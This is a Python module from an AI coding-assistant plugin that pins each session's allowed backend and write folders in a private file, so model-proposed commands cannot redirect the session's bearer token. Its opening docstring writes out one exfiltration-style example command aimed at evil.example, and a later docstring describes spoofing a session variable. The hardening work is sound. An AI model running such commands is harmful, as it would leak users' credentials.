"""The session pin: what this session is bound to, recorded where a command cannot change it.

Plugin scripts run commands a model proposes and a user approves, and some hold
`PLURAI_TOKEN`. A script that read its destination (`PLURAI_URL`) or its write
roots (`WORKDIR`, `TMPDIR`, the current directory) from its own environment would let one command
widen its own allowlist: `PLURAI_URL=https://evil.example script --server https://evil.example`.

So the SessionStart hook records those values once, from the session's own environment, in
`~/.plurai/pins/<session id>.json` (mode 0600, outside the working tree), and the scripts read the
file. The folder is under the account's home as the account database (the profile folder on Windows) names it, never
`HOME` and never a variable such as a harness's plugin data folder, because a command sets its own environment.
Nothing is written into the plugin's install folder: a harness that fingerprints it (Codex) would see every
session's pin as a change to the plugin and stop running its hooks. The session id is the one key a script takes from its environment, through
the resolver the flow markers use (`_workdir.SESSION_VARS`: Copilot's variable, then Codex's, then
Claude Code's), so a pin is written and found the same way on every harness. A wrong id selects a
pin that some session wrote or no pin at all, never a value the command supplied.

The boundary is the environment and the working directory of one command, not the file system: a
command that writes the pin file itself is an ordinary file write the user is shown and approves, like
any other write outside the project.

The pinned backend is the one the session talks to. On Claude Code that is the MCP server's url
(`_login_store.effective_mcp_url`: the launch environment's `PLURAI_URL`, else the manifest default), so a bearer
never goes to a backend other than the one the tools dial; elsewhere it is what `_login_store.resolve_backend`
returns. A loopback backend is pinned with its port like any other. NO PIN is not a free pass: without one
`url_guard.is_backend_url` accepts no destination, so a bearer goes nowhere. A backend is reached only from
inside a session that was started with it. Scripts that write confine to the
working directory only through a pin (`scripts/_confine.py`). The one exception is a Claude Code session whose hooks
did not run (``unpinned_claude_session``): there the bearer may go to the saved login's own backend and nowhere else,
and a script may write inside a ``plurai_sim`` folder (``url_guard``, ``_confine``).

Hook use: ``handle(event)`` runs on SessionStart and SessionEnd and is registered open. It never ends
a session: any failure leaves no pin, which every consumer reads as "refuse".
"""

from __future__ import annotations

import json
import ntpath
import os
import re
import stat
import sys
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING
from urllib.parse import urlsplit

# `python -I` (how shell callers start a script that imports this) leaves this directory off sys.path.
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import _platform  # noqa: E402
import _workdir  # noqa: E402 - the session-id resolver; a copy without it has no pin, which reads as "refuse"

if TYPE_CHECKING:
    from _harness.model import Decision, Event

#: ``None``: the pins live in `~/.plurai/pins` of the account (``pin_dir``). A module attribute and not a variable of
#: the environment, so the location is a fact of the installation that no command can move; tests set it.
PIN_DIR: "Path | None" = None
VERSION = 1
#: A pin older than this belongs to a session that did not end cleanly.
STALE_SECONDS = 14 * 24 * 3600
_DEFAULT_PORTS = {"http": 80, "https": 443}

Origin = tuple  # (scheme, host, port)


def origin(url: str) -> "Origin | None":
    """``(scheme, host, port)`` of an absolute http(s) URL, else None.

    Scheme-less input is refused rather than guessed at: this answers "may a bearer go here", and a
    guess is the wrong side to err on. So is any spelling that two parsers read differently: a
    backslash (a browser or `curl` reads it as `/`, `urlsplit` does not), userinfo, a `%` in the
    authority, whitespace or control characters and a host that is not ASCII (a lookalike letter, a
    full-width dot) all make the answer None, so no client that parses
    the URL its own way can be sent somewhere other than where the comparison looked.
    """
    text = (url or "").strip()
    if "\\" in text or any(ord(char) <= 0x20 or ord(char) == 0x7F for char in text):
        return None
    try:
        parts = urlsplit(text)
        scheme, host, port = parts.scheme.lower(), (parts.hostname or "").lower(), parts.port
    except ValueError:
        return None
    if "@" in parts.netloc or "%" in parts.netloc:
        return None
    if scheme not in _DEFAULT_PORTS or not host:
        return None
    if not host.isascii():
        return None  # an IDN is spelled in punycode: a unicode host is read one way by this parser and another by the resolver
    return scheme, host, _DEFAULT_PORTS[scheme] if port is None else port


def _spell(value: tuple) -> str:
    host = f"[{value[1]}]" if ":" in value[1] else value[1]  # an IPv6 literal is bracketed in a URL
    return f"{value[0]}://{host}:{value[2]}"


def _backend_urls(env: "os._Environ[str] | dict[str, str]", harness: str = "claude") -> list[str]:
    """The REST base a session is pinned to, or none.

    On Claude Code it is the MCP server's (``_login_store.effective_mcp_url`` minus ``/mcp``): what the tools
    dial, which a saved login cannot move. On the other harnesses it is the resolved backend's. A partial or
    missing configuration pins nothing, so no bearer has a destination.
    """
    import _login_store  # noqa: PLC0415 - _login_store imports this module

    if harness == "claude":
        dialled = _login_store.effective_mcp_url(env)
        return [_login_store.api_root(dialled)] if dialled else []
    backend = _login_store.resolve_backend(env)
    return [backend.url] if backend.configured else []


@dataclass(frozen=True)
class Pin:
    origins: set = field(default_factory=set)
    project_dir: str = ""
    temp_dir: str = ""
    workdirs: tuple = ()


_SESSION_ID = re.compile(r"[A-Za-z0-9._-]+")


def _session_id(value: "str | None") -> str:
    """``value`` when given, else the id the environment names (``_workdir.session_id``), when it is a plain file name:
    ASCII letters, digits, ``.``, ``_`` and ``-`` (as ``scripts/trusted-python.sh`` allows), and not ``.`` or ``..``.

    The id comes from an environment a command can set, and it names a file the refusal messages print. A path-shaped id would
    select a file outside the pin directory, and a control character in one would forge a line of a message.
    """
    sid = (_workdir.session_id() if value is None else value).strip()
    if not _SESSION_ID.fullmatch(sid) or sid in (".", ".."):
        return ""
    return sid


def pin_dir() -> Path:
    """Where the pins live: `~/.plurai/pins` under the account's home (``_login_store.account_home``), unless ``PIN_DIR`` is set."""
    if PIN_DIR is not None:
        return PIN_DIR
    import _login_store  # noqa: PLC0415 - _login_store imports this module

    return _login_store.account_home() / ".plurai" / "pins"


def _unsafe(info: os.stat_result, *, directory: bool) -> str:
    """Why an ``lstat``/``fstat`` result is not the user's own private pin folder or file (POSIX), or ``""``."""
    if stat.S_ISLNK(info.st_mode):
        return "is a symlink"
    if not (stat.S_ISDIR(info.st_mode) if directory else stat.S_ISREG(info.st_mode)):
        return "is not a " + ("folder" if directory else "regular file")
    if info.st_uid != os.getuid():
        return "belongs to another account"
    if info.st_mode & 0o022:
        return "can be written by its group or others"
    return ""


def _make_pin_dir() -> Path:
    """The pin folder, made if need be and private to the user: mode 0700 on POSIX, the user's alone on Windows.

    A folder that exists is kept only if it is the user's own, not a symlink and not writable by group or others (as the
    saved login's folder is); anything else raises ``PermissionError``, and no pin is written.
    """
    folder = pin_dir()
    if not folder.parent.exists():
        folder.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    folder.mkdir(mode=0o700, parents=True, exist_ok=True)
    if os.name == "nt":
        import _private_files  # noqa: PLC0415

        _private_files.restrict_directory(folder)
    elif problem := _unsafe(os.lstat(folder), directory=True):
        raise PermissionError(f"the pin folder {folder} {problem}; make it a folder of your own that only you can write, or delete it")
    return folder


def _write_private(path: Path, data: bytes) -> None:
    """``data`` as ``path``, written to a temporary file beside it and moved into place: mode 0600, or the user's alone on Windows."""
    if os.name == "nt":
        import _private_files  # noqa: PLC0415

        _private_files.write_atomic(path, data)
        return
    tmp = path.with_name(f"{path.name}.{os.getpid()}.tmp")  # one temp file per writer: two may pin one id at once
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW  # a name someone planted (a symlink included) is never written through
    try:
        descriptor = os.open(tmp, flags, 0o600)
    except FileExistsError:
        tmp.unlink()  # the leftover of a writer with this pid that died mid-write
        descriptor = os.open(tmp, flags, 0o600)
    with os.fdopen(descriptor, "wb") as handle:
        handle.write(data)
    os.replace(tmp, path)


def _path(sid: "str | None") -> "Path | None":
    sid = _session_id(sid)
    return pin_dir() / f"{sid}.json" if sid else None


def _read_private(path: Path) -> str:
    """The text of a pin file that is the user's own: ``OSError`` for anything else.

    POSIX: the folder must be the user's, not a symlink and not writable by group or others; the file is opened without
    following a symlink and judged on its descriptor (owner, regular file, not writable by group or others).
    Windows: ``windows_private_problem`` judges folder and file.
    """
    if os.name == "nt":
        import _login_store  # noqa: PLC0415

        problem = _login_store.windows_private_problem(path)
        if problem:
            raise PermissionError(problem)
        return path.read_text(encoding="utf-8")
    problem = _unsafe(os.lstat(path.parent), directory=True)
    if problem:
        raise PermissionError(f"the pin folder {problem}")
    descriptor = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)
    with os.fdopen(descriptor, "r", encoding="utf-8") as handle:
        problem = _unsafe(os.fstat(handle.fileno()), directory=False)
        if problem:
            raise PermissionError(f"the pin file {problem}")
        return handle.read()


def refusal(session_id: "str | None" = None) -> str:
    """Why the session's pin is not used although its folder or file exists, as a sentence with the remedy; ``""`` when there is
    no pin, or it is usable.

    ``read()`` answers "no pin" for a pin that is another account's, a symlink or writable by others, and every consumer then
    says the backend is not the one the session is bound to. This is the reason that message leaves out.
    """
    path = _path(session_id)
    if path is None:
        return ""
    folder = path.parent
    delete = f'the folder "{folder}"'
    try:
        if os.name == "nt":
            if not path.exists():
                return ""
            import _login_store  # noqa: PLC0415

            problem = _login_store.windows_private_problem(path)
            what = f"the pin {problem}" if problem else ""
        else:
            problem = _unsafe(os.lstat(folder), directory=True)
            if problem:
                what = f'the pin folder "{folder}" {problem}'
            else:
                problem = _unsafe(os.lstat(path), directory=False)
                what = f'the pin file "{path}" {problem}' if problem else ""
                delete = f'the file "{path}"'
    except FileNotFoundError:
        return ""
    except OSError as exc:
        what = f"the pin cannot be inspected ({exc.strerror or type(exc).__name__})"
    if not what:
        return ""
    import _login_store  # noqa: PLC0415

    return _login_store._printable(f"the session pin cannot be used: {what}; delete {delete} and restart the session, which writes a fresh pin")


def read(session_id: "str | None" = None) -> "Pin | None":
    """This session's pin (the id the environment's session variable names when not given), or None.

    A file that is missing, unreadable, of another version or malformed is no pin: nothing partial
    is ever trusted.
    """
    path = _path(session_id)
    if path is None:
        return None
    try:
        doc = json.loads(_read_private(path))
    except (OSError, ValueError):
        return None
    if not isinstance(doc, dict) or doc.get("version") != VERSION:
        return None
    origins, project, temp, workdirs = doc.get("origins"), doc.get("project_dir"), doc.get("temp_dir"), doc.get("workdirs", [])
    if not isinstance(origins, list) or not all(isinstance(item, str) for item in origins):
        return None
    if not isinstance(project, str) or not isinstance(temp, str):
        return None
    if not isinstance(workdirs, list) or not all(isinstance(item, str) for item in workdirs):
        return None
    parsed = {origin(item) for item in origins}
    if None in parsed:
        return None
    return Pin(origins=parsed, project_dir=project, temp_dir=temp, workdirs=tuple(workdirs))


def backend_origins(session_id: "str | None" = None) -> set:
    """The origins a bearer may be sent to: the pin's, and none when there is no pin."""
    pin = read(session_id)
    return set(pin.origins) if pin is not None else set()


def unpinned_claude_session() -> bool:
    """Whether this is a Claude Code shell (its session variable set, no other harness's) whose session has no usable pin
    and no unsafe one: ``read`` found none and ``refusal`` names nothing. That is a session whose SessionStart hook did
    not run, limited mode (``_workdir.limited_mode``). A pin ``refusal`` objects to (another account's, a symlink, writable
    by others, uninspectable) is not this case: its fix is named. A pin file that is malformed or of another version is
    no pin to ``read`` and passes ``refusal``'s checks, so it counts as "no pin" here too.

    The session variable is read from the environment like every key here, so a command can always reach this answer:
    an env prefix (a made-up ``CLAUDE_CODE_SESSION_ID``, the other harnesses' variables unset) gets here from a shell
    of any harness, hooks on or off. What it may do then is the caller's narrow rule, never a pin: the bearer goes only
    to the saved login's own backend, so the cost is one-backend consistency, never a token leak.
    """
    try:
        if _workdir.harness() != "claude" or not os.environ.get("CLAUDE_CODE_SESSION_ID", "").strip():
            return False
        return read() is None and refusal() == ""
    except Exception:  # noqa: BLE001 - no answer is "not this case": the callers then refuse
        return False


def _workdirs(cwd: str) -> list[str]:
    """The workdir the session's cwd resolves to, when there is one yet."""
    try:
        previous = os.getcwd()
        try:
            os.chdir(cwd)
            found = _workdir.resolve_workdir()
        finally:
            os.chdir(previous)
    except Exception:  # noqa: BLE001 - a failing resolver narrows the pin, it never widens it
        return []
    return [os.path.realpath(str(found))] if found else []


def build(payload: dict, env: "os._Environ[str] | dict[str, str]") -> dict:
    cwd = os.path.realpath(str(payload.get("cwd") or os.getcwd()))
    harness = str(payload.get("harness") or "claude")
    origins = sorted({_spell(found) for found in (origin(url) for url in _backend_urls(env, harness)) if found is not None})
    return {
        "version": VERSION,
        "session_id": str(payload.get("session_id") or ""),
        "origins": origins,
        "project_dir": cwd,
        "temp_dir": os.path.realpath(tempfile.gettempdir()),
        "workdirs": _workdirs(cwd),
        "pinned_at": int(time.time()),
    }


def write(payload: dict, env: "os._Environ[str] | dict[str, str] | None" = None) -> "Path | None":
    path = _path(str(payload.get("session_id") or ""))
    if path is None:
        return None
    _make_pin_dir()
    _write_private(path, (json.dumps(build(payload, os.environ if env is None else env)) + "\n").encode("utf-8"))
    return path


def interpreter_path(sid: "str | None") -> "Path | None":
    """``<pin dir>/<session id>.python``: the interpreter a Windows session's shell helpers trust."""
    sid = _session_id(sid)
    return pin_dir() / f"{sid}.python" if sid else None


def write_interpreter(payload: dict, executable: "str | None" = None) -> "Path | None":
    """On Windows, record the interpreter running this hook for the session's shell helpers.

    Windows has no root-owned interpreter path like ``/usr/bin/python3``, and a ``python3`` a command finds on
    PATH is whatever that command's PATH says. The interpreter the harness started this hook with comes from
    the harness's environment, not a command's, so ``scripts/trusted-python.sh`` runs that one. Elsewhere
    nothing is written.
    """
    if not _platform.WINDOWS:
        return None
    path = interpreter_path(str(payload.get("session_id") or ""))
    found = sys.executable if executable is None else executable
    if path is None or not found or not ntpath.isabs(found):
        return None
    _make_pin_dir()
    _write_private(path, (found + "\n").encode("utf-8"))
    return path


def remove(payload: dict) -> None:
    path = _path(str(payload.get("session_id") or ""))
    if path is not None:
        path.unlink(missing_ok=True)
    interpreter = interpreter_path(str(payload.get("session_id") or ""))
    if interpreter is not None:
        interpreter.unlink(missing_ok=True)


def sweep() -> None:
    """Drop pins of sessions that never ended cleanly."""
    try:
        files = list(pin_dir().glob("*.json"))
    except OSError:
        return
    now = time.time()
    try:
        files += list(pin_dir().glob("*.tmp"))  # what a writer that died mid-write left
        files += list(pin_dir().glob("*.python"))
        files += list(pin_dir().glob("*.lock"))
    except OSError:
        pass
    for path in files:
        try:
            if now - path.stat().st_mtime > STALE_SECONDS:
                path.unlink(missing_ok=True)
        except OSError:
            continue


def _end_stale_wait(event: "Event") -> None:
    """A new session has no question open, so the overview page stops saying the flow waits for an answer: the session
    that asked may have died with no session end to clear it (``simulate_continue.wait_page``). Not after a compaction,
    which keeps the session and its question. Ungated on every harness, so a page that shows no wait
    (``_workdir.page_may_wait``) costs one workdir lookup and a file read. Never raises."""
    try:
        if event.raw.get("source") == "compact":
            return
        workdir = _workdir.resolve_workdir(Path(event.cwd) if event.cwd else None)
        if workdir is None or not _workdir.page_may_wait([workdir]):
            return
        from simulate_continue import wait_page  # noqa: PLC0415 - hooks/ is on sys.path at call time

        wait_page(event, [workdir], False, workdir=workdir)
    except Exception:  # noqa: BLE001 - the next fill rewrites the step anyway; the pin is this hook's job
        return


def handle(event: "Event") -> "Decision":
    """Pin the session at its start and drop the pin at its end. Never a decision, never an error."""
    from _harness import model  # noqa: PLC0415 - the module loads without the codec package beside it

    payload = {"session_id": _workdir.session_id({"session_id": event.session_id}), "cwd": event.cwd, "harness": event.harness}
    try:
        if event.kind == "session_start":
            _end_stale_wait(event)  # first: a pin that cannot be written must not keep a stale wait on the page
            sweep()
            write(payload)
            write_interpreter(payload)
        elif event.kind == "session_end":
            remove(payload)
    except OSError as exc:
        # Said once, because every consumer reads "no pin" as "refuse" and would otherwise give no reason.
        try:
            where = pin_dir()
        except OSError:
            where = "its folder"
        return model.none().with_notice(
            f"plurai-hook: session_pin could not write {where} ({exc}); scripts that send the bearer "
            "will go nowhere this session. The pin folder is under the home the account database names (not HOME), and that "
            "home must be writable by the account that runs the session: fix its permissions, or run the session as the account that owns it."
        )
    return model.none()
